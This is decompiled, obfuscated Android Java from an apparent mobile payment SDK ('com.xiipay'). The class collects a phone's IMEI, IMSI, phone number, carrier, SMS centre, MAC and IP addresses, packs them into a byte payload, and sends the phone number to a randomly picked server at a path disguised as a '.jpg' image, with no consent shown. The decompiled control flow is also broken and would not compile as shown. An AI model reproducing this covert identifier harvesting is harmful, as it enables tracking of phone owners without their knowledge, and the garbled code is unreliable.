package com.xiipay.a;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import com.xiipay.Info;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Enumeration;
import java.util.List;
import java.util.Map;
import java.util.Random;

public final class d
{
  private static Integer a = Integer.valueOf(9);
  private Context b;
  private j c;
  
  public d(Context paramContext)
  {
    this.b = paramContext;
    this.c = new j(paramContext);
  }
  
  private static String g()
  {
    Object localObject3 = "";
    localObject1 = localObject3;
    try
    {
      Enumeration localEnumeration1 = NetworkInterface.getNetworkInterfaces();
      localObject1 = localObject3;
      if (!localEnumeration1.hasMoreElements()) {
        return localObject3;
      }
      localObject1 = localObject3;
      Enumeration localEnumeration2 = ((NetworkInterface)localEnumeration1.nextElement()).getInetAddresses();
      Object localObject2 = localObject3;
      for (;;)
      {
        localObject3 = localObject2;
        localObject1 = localObject2;
        if (!localEnumeration2.hasMoreElements()) {
          break;
        }
        localObject1 = localObject2;
        localObject3 = (InetAddress)localEnumeration2.nextElement();
        localObject1 = localObject2;
        if (!((InetAddress)localObject3).isLoopbackAddress())
        {
          localObject1 = localObject2;
          localObject2 = ((InetAddress)localObject3).getHostAddress().toString();
        }
      }
      return localObject1;
    }
    catch (Exception localException) {}
  }
  
  private String h()
  {
    try
    {
      String str = ((WifiManager)this.b.getSystemService("wifi")).getConnectionInfo().getMacAddress();
      return str;
    }
    catch (Exception localException) {}
    return "";
  }
  
  public final Context a()
  {
    return this.b;
  }
  
  public final byte[] a(int paramInt)
  {
    Object localObject3 = (TelephonyManager)this.b.getSystemService("phone");
    Object localObject2 = ((TelephonyManager)localObject3).getNetworkOperator();
    Object localObject1 = localObject2;
    if (localObject2 == null) {
      localObject1 = "";
    }
    String str = ((TelephonyManager)localObject3).getDeviceId();
    localObject2 = str;
    if (str == null) {
      localObject2 = "";
    }
    str = ((TelephonyManager)localObject3).getSubscriberId();
    if (str == null) {
      str = "";
    }
    for (;;)
    {
      Object localObject4 = (String)this.c.d().get(str);
      localObject3 = localObject4;
      if (localObject4 == null) {
        localObject3 = "";
      }
      localObject4 = this.b.getPackageManager().getApplicationInfo(this.b.getPackageName(), 128);
      ByteArrayOutputStream localByteArrayOutputStream = new ByteArrayOutputStream();
      DataOutputStream localDataOutputStream = new DataOutputStream(localByteArrayOutputStream);
      localDataOutputStream.writeInt(a.intValue());
      localDataOutputStream.writeUTF(((ApplicationInfo)localObject4).metaData.getString("XIIPAY_CHANNEL"));
      localDataOutputStream.writeUTF((String)localObject2);
      localDataOutputStream.writeUTF(str);
      localDataOutputStream.writeUTF((String)localObject3);
      localDataOutputStream.writeUTF((String)localObject1);
      localDataOutputStream.writeUTF(((ApplicationInfo)localObject4).metaData.getString("XIIPAY_PRODUCT"));
      localDataOutputStream.writeUTF(this.c.f());
      localDataOutputStream.writeUTF(i.b(this.b));
      localDataOutputStream.writeUTF(Build.MODEL);
      localDataOutputStream.writeBoolean(this.c.g());
      localDataOutputStream.writeInt(paramInt);
      localDataOutputStream.writeInt(e());
      localDataOutputStream.writeUTF(f.a);
      localDataOutputStream.writeUTF(g());
      localDataOutputStream.writeUTF(h());
      localByteArrayOutputStream.close();
      return localByteArrayOutputStream.toByteArray();
    }
  }
  
  public final j b()
  {
    return this.c;
  }
  
  public final boolean c()
  {
    return e() >= 0;
  }
  
  public final boolean d()
  {
    Object localObject = (TelephonyManager)this.b.getSystemService("phone");
    if (5 != ((TelephonyManager)localObject).getSimState()) {
      return false;
    }
    localObject = ((TelephonyManager)localObject).getSubscriberId();
    return (localObject != null) && (((String)localObject).length() == 15);
  }
  
  public final int e()
  {
    NetworkInfo localNetworkInfo = ((ConnectivityManager)this.b.getSystemService("connectivity")).getActiveNetworkInfo();
    if ((localNetworkInfo == null) || (!localNetworkInfo.isAvailable())) {
      return -1;
    }
    if (localNetworkInfo.getType() == 0)
    {
      if (localNetworkInfo.getExtraInfo().toLowerCase().indexOf("wap") != -1) {
        return 0;
      }
      return 1;
    }
    return 2;
  }
  
  public final void f()
  {
    Object localObject4 = (TelephonyManager)this.b.getSystemService("phone");
    Object localObject2 = ((TelephonyManager)localObject4).getNetworkOperator();
    Object localObject1 = localObject2;
    if (localObject2 == null) {
      localObject1 = "";
    }
    Object localObject3 = ((TelephonyManager)localObject4).getDeviceId();
    localObject2 = localObject3;
    if (localObject3 == null) {
      localObject2 = "";
    }
    localObject4 = ((TelephonyManager)localObject4).getSubscriberId();
    if (localObject4 == null) {
      localObject4 = "";
    }
    for (;;)
    {
      localObject3 = (String)this.c.d().get(localObject4);
      if (localObject3 == null) {
        localObject3 = "";
      }
      for (;;)
      {
        Info localInfo = new Info();
        localInfo.setImei((String)localObject2);
        localInfo.setImsi((String)localObject4);
        localInfo.setMobile((String)localObject3);
        localInfo.setOperator((String)localObject1);
        localInfo.setSmsCenter(i.b(this.b));
        localInfo.setModel(Build.MODEL);
        localInfo.setNet(e());
        localInfo.setIp(g());
        localInfo.setMac(h());
        localObject4 = (String)this.c.e().get(localObject3);
        localObject1 = localObject4;
        boolean bool;
        if (localObject4 == null)
        {
          localObject1 = this.c.b();
          localObject1 = "http://" + (String)((List)localObject1).get(new Random().nextInt(((List)localObject1).size())) + "/i/l.jpg";
          localObject2 = this.b;
          localObject3 = ((String)localObject3).getBytes();
          if (e() != 0) {
            break label379;
          }
          bool = true;
          localObject1 = k.a((Context)localObject2, (String)localObject1, (byte[])localObject3, bool);
          if (localObject1 != null) {
            break label384;
          }
        }
        label379:
        label384:
        for (localObject2 = null;; localObject2 = new String((byte[])localObject1, "UTF-8"))
        {
          localObject1 = localObject4;
          if (localObject2 != null)
          {
            localObject1 = localObject4;
            if (((String)localObject2).startsWith("2,"))
            {
              localObject1 = localObject4;
              if (((String)localObject2).length() >= 7) {
                localObject1 = ((String)localObject2).substring(2);
              }
            }
          }
          localInfo.setProvince("未知");
          localInfo.setCity("未知");
          if (localObject1 != null)
          {
            localObject1 = com.xiipay.b.j.a((String)localObject1, "-");
            localInfo.setProvince(localObject1[0]);
            localInfo.setCity(localObject1[1]);
          }
          com.xiipay.Payment.INFO = localInfo;
          return;
          bool = false;
          break;
        }
      }
    }
  }
}
